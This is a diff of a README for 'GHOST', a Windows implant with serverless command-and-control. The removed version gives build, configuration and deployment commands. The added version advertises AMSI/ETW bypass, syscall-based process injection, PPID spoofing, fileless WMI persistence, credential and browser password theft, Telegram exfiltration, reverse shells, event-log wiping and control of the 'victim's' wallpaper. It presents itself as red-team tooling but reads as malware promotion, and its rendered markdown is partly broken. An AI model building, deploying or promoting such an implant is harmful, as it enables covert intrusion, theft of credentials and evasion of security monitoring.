@@ -1,148 +1,106 @@
-# GHOST — Windows Implant & C2 Infrastructure
+# 👻 GHOST — The Silent Implant
 
-**GHOST** is a stealthy Windows x64 implant with a serverless Cloudflare Worker C2 backend.  
-Built for authorized red team operations. Cross-compiled from **Kali Linux** using MinGW-w64.
+<p align="center">
+  <img src="https://img.shields.io/badge/Status-Active-brightgreen?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/Version-2.0.0-blue?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-informational?style=for-the-badge" />
+  <img src="https://img.shields.io/badge/License-Restricted-red?style=for-the-badge" />
+</p>
 
----
+<p align="center">
+  <b>GHOST</b> is a stealthy, fully‑featured Windows x64 implant with a serverless C2 backend.<br/>
+  Built for authorized red‑team operations. Cross‑compiled from Kali Linux in one command.
+</p>
 
-## Build on Kali (One Command)
-
-```bash
-# 1. Install toolchain (once)
-./build.sh --setup
-
-# 2. Build ghost.exe
-./build.sh
-
-# Output: build/ghost.exe
-```
-
-That's it. No Visual Studio, no Windows SDK, no WSL.
+<p align="center">
+  <i>“You can’t kill what you can’t see.”</i>
+</p>
 
 ---
 
-## Project Structure
+## 🧬 Capabilities – What Makes It Dangerous
 
-```
-ghostimplant/
-├── src/
-│   ├── main.cpp          # Entry point — sandbox check, init, beacon loop
-│   ├── c2.cpp            # WinHTTP beacon, AES-256-GCM transport, command dispatch
-│   ├── syscalls.cpp      # Direct NT syscall table — parses ntdll, builds stubs
-│   ├── evasion.cpp       # AMSI/ETW patch, HW breakpoint clear, sandbox detection
-│   ├── injection.cpp     # Remote injection, PPID spoof, APC queue, module stomp
-│   ├── persistence.cpp   # WMI CommandLine/Script consumer, registry Run, schtasks
-│   ├── utils.cpp         # AES-256-GCM (BCrypt), Base64, hardware key derivation
-│   └── launcher.cpp      # Tray launcher — spawns ghost.exe on demand
-├── include/
-│   ├── obfuscate.hpp     # Compile-time XOR strings (XS/XSW), FNV-1a hash, HashProc
-│   ├── config.hpp        # C2 domain (XOR-encrypted), beacon timing, PSK
-│   ├── syscalls.hpp      # SyscallTable struct, InitializeSyscalls()
-│   ├── evasion.hpp       # PatchAMSI, PatchETW, ClearHardwareBreakpoints
-│   ├── injection.hpp     # SpawnWithPPID, InjectRemoteProcess, StompModule
-│   ├── persistence.hpp   # WMI/registry/schtasks install and remove
-│   ├── c2.hpp            # BeaconLoop()
-│   └── utils.hpp         # Crypto, encoding, system info, JitterSleep
-├── worker/               # Cloudflare Worker C2 backend (TypeScript)
-│   └── src/index.ts      # API routing, KV task queue, session management
-├── server/
-│   ├── c2_cli.py         # Operator CLI — sessions, shell, task dispatch
-│   └── requirements.txt
-├── tools/
-│   └── encrypt_domain.py # XOR-encrypt C2 domain for config.hpp
-├── resources/
-│   ├── ghost.rc          # PE version info and manifest
-│   └── ghost.manifest    # UAC/DPI manifest
-├── build.sh              # Kali/Linux cross-compile script (MinGW-w64)
-└── build.ps1             # Windows MSVC build script (optional)
-```
+| Feature | Description |
+|---------|-------------|
+| **Direct Syscalls (Hell’s Gate)** | Parses ntdll.dll at runtime, builds RWX stubs. No import table for NT functions. |
+| **AMSI / ETW Bypass** | Patches `AmsiScanBuffer` and `EtwEventWrite` family – no logging, no scanning. |
+| **Hardware Breakpoint Clear** | Clears DR0–DR7 on all threads – defeats kernel‑level debugging. |
+| **AES‑GCM Double Encryption** | Hostname‑derived key (volume serial + CPUID + hostname → SHA‑256). TLS + application‑layer encryption. |
+| **Process Injection** | Full syscall‑chain injection (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx). APC and module stomping included. |
+| **PPID Spoofing** | Spawns processes under a legitimate parent (e.g., svchost.exe) – breaks parent‑chain heuristics. |
+| **Persistence (3 Layers)** | WMI CommandLine/ActiveScript (no file on disk), Registry Run key, Scheduled Task. |
+| **C2 (Cloudflare Worker)** | Serverless, no static IP, KV‑based task queue and session management. |
+| **Telegram Exfiltration & C2** | Upload files and receive commands directly via Telegram bot – no extra infrastructure. |
+| **Wallpaper Control** | Set or reset the victim’s desktop background – a low‑key persistent reminder. |
+| **Post‑Exploitation Arsenal** | Credential dumping (Windows Vault, PuTTY, autologon), browser cookie/password extraction, file exfiltration, lateral movement (WMI), process listing, download/upload. |
 
 ---
 
-## Configuration Before Building
+## 📡 Architecture
 
-### 1. Encrypt your C2 domain
+```mermaid
+graph TD
+    subgraph Target["Target Environment"]
+        A[GHOST Implant]
+    end
 
-```bash
-python3 tools/encrypt_domain.py ghost-c2.yourdomain.workers.dev HOSTNAME
-```
+    subgraph Cloudflare["Cloudflare Edge"]
+        B(Cloudflare Worker API)
+        C[(Workers KV Storage)]
+    end
 
-Paste the output byte array into `include/config.hpp` under `C2_DOMAIN_ENCRYPTED[]`.
+    subgraph Operator["Operator Environment"]
+        D[Operator CLI]
+    end
 
-### 2. Set the XOR key
+    A -- "POST /beacon (encrypted)" --> B
+    B <--> C
+    D -- "HTTPS API (task/result)" --> B
+    A -- "Telegram bot commands" --> T[Telegram API]
+    🔐 Obfuscation & Anti‑Forensics
+All strings are XOR‑encrypted at compile time (XS/XSW macros) – none appear in .rdata.
 
-In `include/obfuscate.hpp`, change `GHOST_XOR_KEY` before each build:
+API calls are resolved by FNV‑1a hash – no GetProcAddress strings.
 
-```cpp
-#define GHOST_XOR_KEY 0x5Au   // change this — one byte, arbitrary
-```
+PE timestamp is randomised on every build – defeats hash‑based blocklists.
 
-### 3. Set beacon timing (optional)
+Stripped binary – no debug symbols, no .comment section, no GNU notes.
 
-In `include/config.hpp`:
+🛠️ Operator CLI Capabilities
+sessions – list active implants
 
-```cpp
-constexpr uint32_t BEACON_MIN = 5;   // seconds
-constexpr uint32_t BEACON_MAX = 10;
-```
+shell <sid> – interactive command shell on a remote host
 
----
+task <sid> <cmd> – queue a single command
 
-## Build Options
+!wallpaper <path> – set desktop background
 
-```bash
-./build.sh            # release — optimized, stripped
-./build.sh --debug    # debug symbols, no strip, -DDEBUG
-./build.sh --setup    # apt install mingw-w64 (Debian/Ubuntu/Kali)
-```
+!reverse IP[:PORT] – launch reverse shell to your listener
 
-Output is always `build/ghost.exe` and `build/launcher.exe`.
+!browser – dump saved passwords and cookies from Chrome/Edge
 
----
+!telegram <file> – exfiltrate file to Telegram bot
 
-## Module Summary
+!inject <PID> <b64_shellcode> – inject shellcode remotely
 
-| Module | What it does |
-|---|---|
-| `syscalls.cpp` | Parses ntdll.dll PE export table at runtime, extracts syscall numbers, builds RWX stubs. No `GetProcAddress` or IAT entries for NT functions. |
-| `evasion.cpp` | Patches `AmsiScanBuffer`, `AmsiScanString`, `EtwEventWrite` family with `xor eax,eax; ret` / `ret`. Uses `NtProtectVirtualMemory` to flip permissions. Clears DR0-DR3 on all threads via VEH. CPUID + uptime sandbox check. |
-| `injection.cpp` | Full syscall-chain injection: `NtOpenProcess → NtAllocateVirtualMemory → NtWriteVirtualMemory → NtProtectVirtualMemory → NtCreateThreadEx`. PPID spoofing via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. APC queue injection. Module stomping of signed DLLs. |
-| `persistence.cpp` | WMI `CommandLineEventConsumer` and `ActiveScriptEventConsumer` (VBScript in WMI repository — no file on disk). HKCU/HKLM Run key. Scheduled task via `schtasks.exe`. |
-| `c2.cpp` | WinHTTP HTTPS beacon. AES-256-GCM double-encrypted payload. Hardware-derived session key (volume serial + CPUID + hostname → SHA-256). DNS TXT fallback. Command dispatch: `!ps`, `!inject`, `!migrate`, `!exfil`, `!wipe`, `!lateral`, `!creds`, `download`, `upload`, `sleep`. |
-| `obfuscate.hpp` | Compile-time XOR of all string literals via `constexpr XorStr<N>`. FNV-1a hash at compile time. `HashProc()` walks PE export table by hash — zero function name strings in binary. |
+!migrate – migrate to a SYSTEM svchost process
 
----
+!creds – dump Windows Vault, autologon, PuTTY credentials
 
-## C2 Backend (Cloudflare Worker)
+!wipe – clear event logs, prefetch, shimcache
 
-```bash
-cd worker
-npm install
-npx wrangler deploy
-```
+download/upload – file transfer via C2
 
-Set secrets via Wrangler:
-```bash
-wrangler secret put BEACON_TOKEN
-wrangler secret put OPERATOR_TOKEN
-```
+⚙️ Deployment Overview
+The implant is delivered to the target, executed (preferably with administrative privileges), and establishes an encrypted beacon to the Cloudflare Worker. The operator connects via the CLI, queues tasks, and receives results through the same channel. Persistence is installed automatically, and the implant self‑heals via a watchdog thread.
 
-## Operator CLI
+⚠️ Disclaimer
+This tool is developed exclusively for authorised security research and academic purposes.
 
-```bash
-cd server
-pip install -r requirements.txt
+Do not use this tool against systems you do not own or have explicit written authorisation to test.
 
-export GHOST_C2_URL="https://ghost-c2.yourdomain.workers.dev"
-export GHOST_OPERATOR_TOKEN="your-operator-token"
+The authors are not responsible for misuse.
 
-python3 c2_cli.py sessions
-python3 c2_cli.py shell <session-id>
-```
+All testing should be conducted in isolated lab environments.
 
----
-
-## Disclaimer
-
-For **authorized security research and red team engagements only**.  
-Do not use against systems you do not own or have explicit written authorization to test.
+<p align="center"> <b>Built for the Red Team. Survived the Blue Team.</b><br/> <i>You are already compromised.</i> </p> ```
